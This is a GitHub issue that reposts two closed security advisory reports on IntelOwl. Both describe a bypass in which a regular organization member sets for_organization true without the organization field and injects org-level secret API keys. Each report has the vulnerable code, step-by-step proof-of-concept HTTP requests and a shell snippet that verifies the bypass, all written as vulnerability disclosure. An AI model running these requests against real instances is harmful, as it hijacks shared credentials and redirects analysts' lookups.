https://github.com/intelowlproject/IntelOwl/issues/3848

## Finding 1: Organization member can create org-level plugin configs bypassing admin-only restriction

reported on 4 June 2026 and closed because it's AI: https://github.com/intelowlproject/IntelOwl/security/advisories/GHSA-r282-pc7g-rwq4

### Summary

A regular organization member (non-admin, non-owner) can create organization-level
plugin configurations -- including secret API keys -- by setting `for_organization: true`
directly in the POST body sent to `POST /api/plugin-config`. The intended access control
requires the requester to be an organization owner or admin before creating configs with
`for_organization: true`, but this check only runs when the optional `organization` field
is also supplied. Omitting the `organization` field while setting `for_organization: true`
bypasses the check entirely. A malicious member can therefore inject an API key (or any
other plugin parameter) as an org-level config, causing that value to be used by every
org member -- including admins -- when they run analyzers that rely on organization-level
configuration.

### Details

The authorization gate is implemented in
`api_app/serializers/__init__.py` inside `ModelWithOwnershipSerializer.validate()` at
lines 67-82:

```python
def validate(self, attrs):
    org = attrs.pop("organization", None)
    if org:
        if org.owner == attrs["owner"] or (
            attrs["owner"].has_membership()
            and attrs["owner"].membership.organization.pk == org.pk
            and attrs["owner"].membership.is_admin
        ):
            attrs["for_organization"] = True
        else:
            raise ValidationError({"detail": "You are not owner or admin of the organization"})
    return super().validate(attrs)
```

The guard only fires when the `organization` field is present. A client who sets
`for_organization: true` in the request body without supplying the `organization` field
bypasses this block entirely. The serializer then creates a `PluginConfig` row with
`for_organization=True` and `owner` set to the authenticated user -- a regular member.

The `PluginConfig.organization` derived property (used in
`api_app/queryset.py` `ModelWithOwnershipQuerySet.visible_for_user_by_org()`) looks up
org membership from the config owner's membership, so the injected record correctly
resolves to the attacker's organization:

```python
def visible_for_user_by_org(self, user: User):
    membership = Membership.objects.get(user=user)
    return self.filter(
        for_organization=True,
        owner__membership__organization=membership.organization,
    )
```

When an admin or another member later runs an analyzer, `ParameterQuerySet._alias_org_value_for_user()`
fetches the first matching org-level config (`[:1]` slice in
`api_app/queryset.py` lines 484-497). If the admin has not previously set that parameter,
the attacker's injected value is returned as `org_value` and is applied to the analyzer
execution.

### PoC

Requirements: a multi-user IntelOwl instance with at least one organization. The attacker
has a regular (non-admin, non-owner) membership in that organization.

Step 1 -- obtain an API token for the regular member account (Bob):

```
POST /api/auth/login  {"username": "bobvr", "password": "Bob1234!"}
POST /api/auth/apiaccess  (with session cookie)
-> TOKEN=<bob_token>
```

Step 2 -- inject an org-level plugin config without supplying the `organization` field:

```
POST /api/plugin-config
Authorization: Token <bob_token>
Content-Type: application/json

[{
  "parameter": 21,
  "value": "MALICIOUS_KEY_INJECTED_BY_MEMBER",
  "analyzer_config": "AbuseIPDB",
  "for_organization": true
}]
```

Response (HTTP 201):
```json
[{
  "id": 371,
  "value": "MALICIOUS_KEY_INJECTED_BY_MEMBER",
  "attribute": "api_key_name",
  "analyzer_config": "AbuseIPDB",
  "for_organization": true,
  "owner": "bobvr",
  "organization": "OrgBeta"
}]
```

Step 3 -- verify the injected config is now the effective org-level value for admin/owner.
The following Django shell snippet confirms the behavior server-side:

```python
from django.contrib.auth import get_user_model
from api_app.analyzers_manager.models import AnalyzerConfig
U = get_user_model()
alice = U.objects.get(username='alicevr')  # org owner, has not set a key
config = AnalyzerConfig.objects.get(name='AbuseIPDB')
params = config.python_module.parameters.annotate_value_for_user(config, alice)
for p in params:
    if p.is_secret:
        print(p.name, '->', p.value, '| is_from_org:', p.is_from_org)
# Output: api_key_name -> MALICIOUS_KEY_INJECTED_BY_MEMBER | is_from_org: True
```

Observed on commit 38ebe10 (v6.6.1), IntelOwl running in Docker with postgres + redis.
Bob's membership: non-admin, non-owner of OrgBeta. Alice's role: owner of OrgBeta.

### Impact

Any authenticated organization member can create organization-level plugin configurations
-- including API keys and other secret parameters -- for any plugin without possessing
owner or admin status. In the worst case the attacker's injected key supersedes the
legitimate org key, causing all org members' analyzer runs to authenticate against
external TI services using the attacker-supplied credential (allowing the attacker to
monitor or exhaust the real org's API quota, or substitute a key that routes traffic
to an attacker-controlled service). A member who joins an organization before the admin
has configured any keys can inject the initial org-level config and retain that effect
even after the admin onboards normally, unless the admin notices and deletes the extra
config entry.



## Finding 2: Organization member can create org-level plugin configs (incl. secret API keys) bypassing the admin-only restriction

reported on 19 June 2026 and closed: https://github.com/intelowlproject/IntelOwl/security/advisories/GHSA-g95f-52r9-c6j4

### Summary

A regular organization member (non-admin, non-owner) can create organization-level
plugin configurations -- including secret API keys -- by setting `for_organization: true`
in the body of `POST /api/plugin-config` while **omitting the optional `organization` field**.
The intended access control requires the requester to be an organization owner or admin
before creating configs with `for_organization: true`, but that check only runs when the
`organization` field is supplied. Omitting `organization` while still setting
`for_organization: true` skips the check entirely, and the config is created at organization
level under the attacker's ownership. The injected value then resolves as the effective
org-level configuration for every member of the organization -- including admins -- when they
run plugins that have no per-user override for that parameter.

### Details

The authorization gate is in `api_app/serializers/__init__.py`,
`ModelWithOwnershipSerializer.validate()` (lines 67-82):

```python
def validate(self, attrs):
    org = attrs.pop("organization", None)
    if org:                                          # <-- gate only runs when organization is present
        if org.owner == attrs["owner"] or (
            attrs["owner"].has_membership()
            and attrs["owner"].membership.organization.pk == org.pk
            and attrs["owner"].membership.is_admin
        ):
            attrs["for_organization"] = True
        else:
            raise ValidationError({"detail": "You are not owner or admin of the organization"})
    return super().validate(attrs)
```

`organization` is an optional, write-only field (`required=False`, `default=None`). When it is
absent, `org` is `None`, the `if org:` block is skipped, and the owner/admin check never runs.
`for_organization` is taken directly from the request body and is **not** reset when the gate
is skipped, so a `PluginConfig` row is created with `for_organization=True` and `owner` set to
the authenticated member.

`PluginConfigViewSet` (`api_app/views.py`, `class PluginConfigViewSet`) inherits
`ModelWithOwnershipViewSet`, whose `get_permissions()` only adds the
`IsObjectAdminPermission | IsObjectOwnerPermission` check for the `destroy`/`update`/`retrieve`
actions -- **`create` has no such guard**, so the serializer's `validate()` is the only
authorization on creation.

The injected record then qualifies as a legitimate org-level config because the org filtering
keys off the owner's organization membership, not on `is_admin`
(`api_app/queryset.py`, `ModelWithOwnershipQuerySet.visible_for_user_by_org()`, lines 700-718):

```python
def visible_for_user_by_org(self, user: User):
    membership = Membership.objects.get(user=user)
    return self.filter(
        for_organization=True,
        owner__membership__organization=membership.organization,
    )
```

When another member runs an analyzer, `ParameterQuerySet._alias_org_value_for_user()`
(`api_app/queryset.py`, lines 470-497) selects the first matching org-level config
(`.values("value")[:1]`). If the admin has not set that parameter, the attacker's injected
value is returned as `org_value` and applied to the run.

### PoC

Requirements: a multi-user IntelOwl instance with at least one organization. The attacker
holds a regular (non-admin, non-owner) membership in that organization. Below, `bobvr` is the
member and `OrgBeta` is the org owned by `alicevr`.

Step 1 -- obtain an API token for the member account:

```
POST /api/auth/login    {"username":"bobvr","password":"<member_pw>"}      -> 200 (session cookie)
POST /api/auth/apiaccess  (session cookie + X-CSRFToken)                   -> 201 {"key":"<member_token>"}
```

Step 2 -- inject an org-level plugin config WITHOUT supplying `organization`:

```
POST /api/plugin-config
Authorization: Token <member_token>
Content-Type: application/json

[{"parameter": 21, "value": "<INJECTED_KEY>", "analyzer_config": "AbuseIPDB", "for_organization": true}]
```

(`parameter: 21` is the secret `api_key_name` parameter of the `AbuseIPDB` analyzer in the
default seed; any secret parameter id works.)

Response -- **HTTP 201**:

```json
[{
  "id": <id>,
  "value": "<INJECTED_KEY>",
  "attribute": "api_key_name",
  "analyzer_config": "AbuseIPDB",
  "for_organization": true,
  "owner": "bobvr",
  "organization": "OrgBeta"
}]
```

The non-admin member successfully created a `for_organization=true` config.

Step 3 -- CONTROL: the same request WITH the `organization` field is rejected, proving the
omission is the bypass:

```
POST /api/plugin-config
Authorization: Token <member_token>
Content-Type: application/json

[{"parameter": 21, "value": "<INJECTED_KEY>", "analyzer_config": "AbuseIPDB", "for_organization": true, "organization": "OrgBeta"}]
```

Response -- **HTTP 400**:

```json
{"errors": [{"detail": ["You are not owner or admin of the organization"]}]}
```

Step 4 -- the injected config is now the effective org-level value for the admin/owner who has
set no key (real-code resolution against the running instance):

```python
from django.contrib.auth import get_user_model
from api_app.analyzers_manager.models import AnalyzerConfig
alice = get_user_model().objects.get(username='alicevr')   # org owner/admin, no key set
config = AnalyzerConfig.objects.get(name='AbuseIPDB')
for p in config.python_module.parameters.annotate_value_for_user(config, alice):
    if p.is_secret:
        print(p.name, '->', p.value, '| is_from_org:', p.is_from_org)
# api_key_name -> <INJECTED_KEY> | is_from_org: True
```

### Impact

Any authenticated organization member can create organization-level plugin configurations --
including API keys and other secret parameters -- for any plugin without holding owner or admin
status. The injected value becomes the effective org credential whenever the admin has not
already set that parameter, so all org members' analyzer runs authenticate against external
threat-intelligence services using the attacker-supplied credential. This lets the attacker
route org traffic through a credential they control (monitoring lookups, exhausting the real
org's API quota, or pointing analyzers at an attacker-controlled endpoint). A member who joins
before the admin has configured keys can seed the initial org-level config and retain that
effect indefinitely unless an admin notices and deletes the extra row.



